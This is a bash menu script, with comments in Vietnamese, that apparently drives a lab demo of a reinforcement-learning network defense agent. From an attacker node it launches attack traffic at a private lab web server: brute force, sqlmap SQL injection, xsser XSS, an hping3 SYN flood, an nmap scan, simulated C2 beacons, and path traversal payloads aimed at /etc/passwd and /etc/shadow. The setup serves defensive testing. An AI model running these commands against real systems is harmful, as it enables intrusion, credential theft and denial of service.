#!/bin/bash
# Demo Menu — AI RL Defense Agent
# Chạy trong Node: attacker (10.0.10.10)
# Usage: bash demo_menu.sh

SSLKEY="SSLKEYLOGFILE=/tmp/tls_keys.log"
WEB="https://192.168.10.10"
XSSER_DIR="/opt/xsser"

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

demo_curl() {
    SSLKEYLOGFILE=/tmp/tls_keys.log curl -sk \
        --http1.1 \
        --no-sessionid \
        --no-keepalive \
        -H 'Connection: close' \
        -H 'Cache-Control: no-cache' \
        -H 'Pragma: no-cache' \
        "$@"
}

demo_page() {
    local path="$1"
    demo_curl -o /dev/null "$WEB$path"
}

print_menu() {
    clear
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}   AI RL DEFENSE AGENT — DEMO MENU         ${NC}"
    echo -e "${CYAN}============================================${NC}"
    echo -e "  ${GREEN}1${NC}  Noisy normal           → RateLimit"
    echo -e "  ${GREEN}2${NC}  Brute Force Login      → Redirect"
    echo -e "  ${GREEN}3${NC}  SQL Injection          → Redirect"
    echo -e "  ${GREEN}4${NC}  XSS Attack             → Redirect"
    echo -e "  ${GREEN}5${NC}  SYN Flood DDoS         → Block"
    echo -e "  ${GREEN}6${NC}  Port Scan              → Block"
    echo -e "${CYAN}  --- ACT 7: Ngoài vùng train -------------${NC}"
    echo -e "  ${YELLOW}7a${NC} C2 Beaconing           → Allow (honest limitation)"
    echo -e "  ${YELLOW}7b${NC} Path Traversal         → Allow (honest limitation)"
    echo -e "${CYAN}--------------------------------------------${NC}"
    echo -e "  ${YELLOW}v${NC}  Verify: IP đang bị gì?"
    echo -e "  ${RED}r${NC}  Reset (xóa rule attacker)"
    echo -e "  ${RED}q${NC}  Thoát"
    echo -e "${CYAN}--------------------------------------------${NC}"
    echo -ne "Chọn kịch bản: "
}

run_scenario() {
    case "$1" in

    1)
        echo -e "\n${GREEN}[KC1] Noisy Normal → RateLimit${NC}"
        PATHS=(
            "/"
            "/login"
            "/register"
        )
        for i in $(seq 1 18); do
            path="${PATHS[$(( (i - 1) % ${#PATHS[@]} ))]}"
            demo_page "$path" &
            sleep 0.09
        done
        wait
        ;;

    2)
        echo -e "\n${GREEN}[KC2] Brute Force Login → Redirect${NC}"
        SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
        SSLKEYLOGFILE=/tmp/tls_keys.log python3 "$SCRIPT_DIR/brute_keepalive.py"
        ;;

    3)
        echo -e "\n${GREEN}[KC3] SQL Injection → Redirect${NC}"
        echo "Chạy sqlmap --delay=1 (để tshark kịp decrypt)..."
        SSLKEYLOGFILE=/tmp/tls_keys.log sqlmap \
            -u "$WEB/?search=test" \
            --batch --level=1 --risk=1 \
            --ignore-code=401 --no-cast \
            --delay=1
        echo "Verify:"
        demo_curl "$WEB/?cb=$(date +%s%N)" 2>&1 | grep -o "T3ch Stor3" \
            && echo -e "${YELLOW}→ Đang nhận trang HONEYPOT${NC}" \
            || echo -e "${GREEN}→ Vẫn nhận trang webserver thật${NC}"
        ;;

    4)
        echo -e "\n${GREEN}[KC4] XSS Attack → Redirect${NC}"
        if [ ! -d "$XSSER_DIR" ]; then
            echo -e "${RED}Không tìm thấy $XSSER_DIR${NC}"
        else
            cd "$XSSER_DIR"
            SSLKEYLOGFILE=/tmp/tls_keys.log python3 xsser \
                --url "$WEB/?search=XSS" \
                -p "search=XSS" \
                --auto --delay=1
            cd - > /dev/null
        fi
        ;;

    5)
        echo -e "\n${GREEN}[KC5] SYN Flood DDoS → Block${NC}"
        echo "Đang flood 500 SYN packets..."
        hping3 -S -p 443 --flood -c 500 192.168.10.10
        ;;

    6)
        echo -e "\n${GREEN}[KC6] Port Scan → Block${NC}"
        nmap -sS -T4 -p 1-1000 192.168.10.10
        ;;

    v)
        echo -e "\n${CYAN}[Verify] Webserver hay Honeypot?${NC}"
        RESULT=$(demo_curl --max-time 3 "$WEB/?cb=$(date +%s%N)" 2>&1)
        if echo "$RESULT" | grep -q "T3ch Stor3"; then
            echo -e "${YELLOW}→ HONEYPOT (bị Redirect)${NC}"
        elif echo "$RESULT" | grep -q "Tech Store"; then
            echo -e "${GREEN}→ WEBSERVER thật (Allow / Block đã gỡ)${NC}"
        else
            echo -e "${RED}→ Không nhận được response (bị Block hoặc timeout)${NC}"
        fi
        ;;

    r)
        echo -e "\n${RED}[Reset] Xóa rule attacker — chạy lệnh này trên NODE ROUTER:${NC}"
        echo ""
        echo "  nsenter -n -t \$(pgrep -f 'mininet:r' | head -1) bash -c \\"
        echo "    \"iptables -D FORWARD -s 10.0.10.10 -j DROP 2>/dev/null; \\"
        echo "     iptables -D INPUT -s 10.0.10.10 -j DROP 2>/dev/null; \\"
        echo "     iptables -D FORWARD -s 10.0.10.10 -m hashlimit --hashlimit-name rl_10_0_10_10 --hashlimit-above 2/sec --hashlimit-burst 5 -j DROP 2>/dev/null; \\"
        echo "     iptables -t nat -D PREROUTING -i r-ext -s 10.0.10.10 -d 192.168.10.10 -p tcp --dport 443 -j REDIRECT --to-ports 4443 2>/dev/null; \\"
        echo "     true\""
        echo ""
        echo -e "${YELLOW}(Reset phải chạy từ terminal Router, không phải Attacker)${NC}"
        ;;

    "7a")
        echo -e "\n${YELLOW}[KC7a] C2 Beaconing (chưa train) → Allow/RateLimit (honest limitation)${NC}"
        echo "Simulate beacon mỗi 8s trong ~2 phút (Ctrl+C để dừng sớm)..."
        for i in $(seq 1 15); do
            demo_curl "$WEB/beacon?id=c2_$(hostname)&seq=$i&cb=$(date +%s%N)" -o /dev/null
            echo "  Beacon $i/15 gửi xong, chờ 8s..."
            sleep 8
        done
        ;;

    "7b")
        echo -e "\n${YELLOW}[KC7b] Path Traversal (chưa train) → Allow (honest limitation)${NC}"
        echo "Gửi path traversal payloads..."
        for path in "../etc/passwd" "../../etc/shadow" "../../../proc/version"; do
            demo_curl "$WEB/?file=$path&cb=$(date +%s%N)" -o /dev/null
            echo "  Sent: $path"
        done
        ;;

    q)
        echo "Thoát."
        exit 0
        ;;

    *)
        echo -e "${RED}Không hợp lệ.${NC}"
        ;;
    esac
}

# Main loop
while true; do
    print_menu
    read -r choice
    run_scenario "$choice"
    echo ""
    echo -ne "Nhấn Enter để tiếp tục..."
    read -r
done
